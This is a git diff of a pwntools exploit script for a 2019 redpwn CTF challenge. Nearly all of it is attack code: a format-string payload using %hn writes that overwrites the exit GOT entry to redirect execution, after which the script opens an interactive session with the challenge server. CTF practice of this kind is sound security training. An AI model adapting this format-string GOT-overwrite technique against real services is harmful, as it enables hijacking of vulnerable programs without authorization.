@@ -1,6 +1,4 @@
 from pwn import *
-import json
-import requests
 
 ip = "chall.2019.redpwn.net"
 port = 4003
@@ -23,6 +21,7 @@ winners_got = 0x08048737
 exploit = "%2052c%19$hn%32563c%20$hn".ljust( 0x30 , '\x00' )+p32(exit_got+2)+p32(exit_got)
 # 0x30 = 48 
 # 32bit => 48/4= 12  7+12=19
-r.send(exploit)
+
 raw_input("aa")
+r.send(exploit)
 r.interactive()
